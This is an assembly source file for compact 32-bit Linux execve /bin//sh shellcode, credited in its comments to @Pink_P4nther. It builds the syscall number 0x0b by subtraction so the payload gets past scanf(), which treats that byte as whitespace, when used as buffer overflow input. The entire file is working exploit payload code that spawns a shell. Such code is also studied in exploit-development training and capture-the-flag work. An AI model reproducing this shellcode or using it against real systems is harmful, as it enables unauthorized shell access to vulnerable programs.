
; /bin//sh execve shellcode by @Pink_P4nther.
; The point of this shellcode is to bypass when 0x0b (11) is a bad byte.
; This helped when giving overflow input to scanf() for example.
; scanf() sees 0x0b as white space therefore ending the read from STDIN.
; 29 bytes.


section .text

global _start

_start:
	xor eax,eax ; Zero eax
	push eax ; Put 0 on the stack
	push 0x68732f2f ; Push //sh on the stack
	push 0x6e69622f ; Push /bin on the stack
	mov ebx,esp ; Move /bin//sh into ebx
	xor ecx,ecx ; Zero ecx
	mov edx,ecx ; Move zero into edx
	mov eax,0xffffffff ; Move max 32 bit unsigned integer into eax
	sub eax,0xfffffff4 ; Subtract from eax to create 0xb
	int 0x80 ; Software interrupt for system call
